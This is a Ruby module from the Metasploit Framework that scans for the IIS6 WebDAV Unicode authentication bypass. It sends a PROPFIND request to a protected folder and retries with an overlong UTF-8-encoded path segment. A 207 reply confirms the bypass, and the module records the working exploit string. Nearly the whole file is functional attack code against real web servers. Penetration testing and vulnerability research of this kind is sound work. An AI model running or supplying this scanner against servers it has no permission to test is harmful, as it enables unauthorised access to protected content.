##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'rex/proto/http'
require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::WMAPScanDir
	include Msf::Auxiliary::Scanner

	def initialize(info = {})
		super(update_info(info,	
			'Name'   		=> 'MS09-XXX 0day IIS6 WebDAV Unicode Auth Bypass',
			'Description'	=> %q{
				Simplified version of MS09-XXX 0day IIS6 WebDAV Unicode Auth Bypass scanner. It attempts
				to bypass authentication using the WebDAV IIS6 Unicode vulnerability
				discovered by Kingcope. The vulnerability appears to be exploitable
				where WebDAV is enabled on the IIS6 server, and any protected folder
				requires either Basic, Digest or NTLM authentication.
			},
			'Author' 		=> [ 'patrick' ],
			'License'		=> MSF_LICENSE,
			'Version'		=> '$Revision: 6580 $'))   
			
		register_options(
			[
				OptString.new('PATH', [ true,  "The path to protected folder", '/'])			
			], self.class)	
						
	end

	def run_host(ip)
		tpath = datastore['PATH'] 	
		if tpath[-1,1] != '/'
			tpath += '/'
		end
 	
		vhost = datastore['VHOST'] || wmap_target_host
		prot  = datastore['SSL'] ? 'https' : 'http'
				
		webdav_req = %q|<?xml version="1.0" encoding="utf-8"?><propfind xmlns="DAV:"><prop><getcontentlength xmlns="DAV:"/><getlastmodified xmlns="DAV:"/><executable xmlns="http://apache.org/dav/props/"/><resourcetype xmlns="DAV:"/><checked-in xmlns="DAV:"/><checked-out xmlns="DAV:"/></prop></propfind>|

		begin
			res = send_request_cgi({
				'uri'  		=>  tpath,
				'method'   	=> 'PROPFIND',
				'ctype'		=> 'application/xml',
				'headers' 	=> 
					{
					},
				'data'		=> webdav_req + "\r\n\r\n",
			}, 20)

			if(not res)
				print_error("NO Response.")
			elsif (res.code.to_i == 401)
				print_status("Comfirmed protected folder #{wmap_base_url}#{tpath} #{res.code} (#{wmap_target_host})")
				print_status("\tTesting for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.")
					
				cset  = %W{ & ^ % $ # @ ! }
				buff  = ''
				blen  = rand(16)+1
				while(buff.length < blen)
					buff << cset[ rand(cset.length) ]
				end
				bogus = Rex::Text.uri_encode(Rex::Text.to_unicode( buff, 'utf-8', 'overlong', 2))

				res = send_request_cgi({
					'uri'  		=>  tpath + bogus+'/',
					'method'   	=> 'PROPFIND',
					'ctype'		=> 'application/xml',
					'headers' 	=> 
						{
							#'Translate'	 => 'f', # Not required in PROPFIND, only GET - patrickw 20091518
						},
					'data'		=> webdav_req + "\r\n\r\n",
				}, 20)
					
				if (res.code.to_i == 207)
					print_status("\tFound vulnerable WebDAV Unicode bypass.  #{wmap_base_url}#{tpath}#{bogus}/ #{res.code} (#{wmap_target_host})")

					rep_id = wmap_base_report_id(
									wmap_target_host,
									wmap_target_port,
									wmap_target_ssl
							)
					vuln_id = wmap_report(rep_id,'VULNERABILITY','WEBDAV_UNICODE_BYPASS',"#{res.code}","Directory #{tpath} vulnerable WebDAV Unicode bypass.")
					wmap_report(vuln_id,'WEBDAV_UNICODE_BYPASS','EXPLOIT_STRING',"#{tpath}#{bogus}/",nil)
				end
			else
				print_error("Folder does not require authentication. [#{res.code}]")
			end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE			
		end
	end
end
